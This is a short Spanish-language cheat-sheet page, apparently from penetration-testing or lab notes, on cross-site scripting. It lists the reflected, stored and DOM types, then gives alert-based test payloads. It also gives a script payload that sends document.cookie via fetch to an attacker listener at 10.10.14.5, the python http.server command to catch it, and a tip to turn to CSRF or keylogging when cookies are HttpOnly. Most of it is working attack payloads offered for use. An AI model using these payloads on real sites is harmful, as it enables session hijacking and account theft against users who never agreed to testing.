---
title: Cross-Site Scripting (XSS)
order: 3
description: Tipos de XSS (reflejado, almacenado, DOM), payloads de prueba y robo de cookies de sesión.
---

## Tipos

- **Reflejado** — el payload viaja en la petición y se refleja en la respuesta.
- **Almacenado** — el payload se guarda en el servidor (comentarios, perfiles).
- **DOM** — la ejecución ocurre en el cliente al manipular el DOM.

## Payloads de prueba

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

## Robo de cookies

```html
<script>
fetch('http://10.10.14.5/c?='+document.cookie)
</script>
```

Levanta un listener para recibirlas:

```bash wrap=false
python3 -m http.server 80
```

> [!IMPORTANT]
> Si la cookie tiene el flag `HttpOnly`, no será accesible desde JavaScript. Busca otros vectores (CSRF, keylogging).
